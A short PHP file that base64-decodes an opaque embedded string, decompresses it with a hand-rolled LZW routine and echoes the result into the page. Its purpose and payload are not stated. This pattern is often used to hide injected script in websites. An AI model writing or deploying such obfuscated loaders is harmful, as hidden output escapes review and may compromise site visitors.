<?php
function f(){

$e = base64_decode("RzQbzmdDEdYGZTkcwUSTMIDoaIQZROcxAczebTLDzSbjPFTocjDHDLCzcIDybzqIDcZTSZzQYjecoCbzICivAZNKBAZzebjcYRAYzCbDYCoBAoJBjpCIVDIdEDlEopFoxGo4IDvLDlNSCbjIIDSdBAZJ6J7EbDebzXO7TNZub5zKZ5PqBQqJRoDA4LB4SCoWIDDG7NgDNIDTXzfDTdcJdSL/gTdgzDhcDiMVjLydL9TpOdRPUYqZZZV6sZ4UUjrPo3HYecpRLrichBEDDbpxQpLnaDQ6LR71SqYCq7YDcdjSczSYjYZRAbZCCinyzKcNXxNiIDEZdtcN1c5/u7vvqTfIVj8FYsnhstKsxjiTgPPhPUIMT7J3mb9b7jbLp4N7mV7UtfWcShn3MbxgFoSsChQGkY1rHUcFPcwcEBgtXVfXZ/1IgFwXmZF6GUYd9GXfd7mzRFYFnGkaxlRRD3MGcaRyGxTXwiB8mViR9mNQMChZGUYRoSaQZDHmRZEkJ+U4HlQHeXVvF4hxwF9QtDWdCcdnMGhtWAWNAnMfUYQKEZURhGseYmQN2BhGIeY/Tp2R0gJ/pSb95F+EwZRtRhDhlURJlAVRGRoasChCUpgnNmeLnNcwZmiGxbE0ZuN2SiJ62LmpmnvZCl3zfWmo9ZoChEWVYhnRlux1S56IKcymmLX54odlVNxlSVYVBRejWta+RkobJZExAoVRucsc0UboalKVhIVioNzUxSN71WWtupynSGp2eOAnlfqTX8d+260lS35Mk5PbjlG5Z4X+1n7tlCJ1u23pLdy6X9uSALmpVuGDbRsmdTa6LilB4b8u4TEoGRCLcrW574wa9MJvbBFwbigcUlO7rgvm68Ixy3g=");
	$d = 256;
	$b = 8;
	$c = array();
	$r = 0;
	$l = 0;
	for ($i=0; $i < strlen($e); $i++) {
		$r = ($r << 8) + ord($e[$i]);
		$l += 8;
		if ($l >= $b) {
			$l -= $b;
			$c[] = $r >> $l;
			$r &= (1 << $l) - 1;
			$d++;
			if ($d > (1 << $b)) {
				$b++;
			}
		}
	}
	

	$t = range("\0", "\xFF");
	$f = "";
	foreach ($c as $i => $o) {
		$m = $t[$o];
		if (!isset($m)) {
			$m = $w . $w[0];
		}
		$f .= $m;
		if ($i) {
			$t[] = $w . $m[0];
		}
		$w = $m;
	}
	echo $f;
}
f();
?>